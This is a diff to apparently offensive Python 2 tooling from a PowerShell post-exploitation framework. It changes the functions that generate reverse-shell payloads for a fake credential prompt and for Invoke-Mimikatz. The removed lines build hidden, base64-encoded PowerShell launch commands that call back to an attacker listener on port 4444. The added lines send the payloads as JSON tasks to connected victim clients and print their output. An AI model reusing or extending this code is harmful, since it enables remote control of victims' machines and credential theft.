@@ -6,7 +6,7 @@ from generatepayload import *
 def checkClientUpload(payloadname, powershellExec, isExe):
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
-        DoClientUpload(payloaddir(),payloadname,powershellExec,isExe)
+        return DoClientUpload(payloaddir(),payloadname,powershellExec,isExe)
     else:
         print powershellExec
 
@@ -130,43 +130,33 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     return "pass"
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
-    portnum,ipaddr = reverseIpAndPort('4444')
-
-    shellcode = payloadchoice % (ipaddr,portnum)
-    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
-    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec,isExe=False)
-    from listener import Server
-    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    print 'waiting for connection...\nCTRL + C when done\n'
+    json = '{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
+    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
+    from stager import returnServerList
     try:
-        while not listenerserver.handlers:
-            time.sleep(0.5)
-        while listenerserver:
-            if listenerserver.handlers[1].in_buffer:
-                print listenerserver.handlers[1].in_buffer.pop()
+        for server in returnServerList():
+            while True:
+                if server.handlers[clientnumber].in_buffer:
+                    print server.handlers[clientnumber].in_buffer.pop()
+                    break
+                else:
+                    time.sleep(0.1)
     except KeyboardInterrupt:
-        if listenerserver.handlers:
-            listenerserver.handlers[1].handle_close()
+        pass
     return "pass"
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
-    portnum,ipaddr = reverseIpAndPort('4444')
-
-    shellcode = payloadchoice % (ipaddr,portnum)
-    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
-    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec,isExe=False)
-    from listener import Server
-    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    print 'waiting for connection...\nCTRL + C when done\n'
+    json = '{"type":"script", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
+    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
+    from stager import returnServerList
     try:
-        while not listenerserver.handlers:
-            time.sleep(0.5)
-        while listenerserver:
-            if listenerserver.handlers[1].in_buffer:
-                print listenerserver.handlers[1].in_buffer.pop()
+        for server in returnServerList():
+            while True:
+                if server.handlers[clientnumber].in_buffer:
+                    print server.handlers[clientnumber].in_buffer.pop()
+                    break
+                else:
+                    time.sleep(0.1)
     except KeyboardInterrupt:
-        if listenerserver.handlers:
-            listenerserver.handlers[1].handle_close()
+        pass
     return "pass"
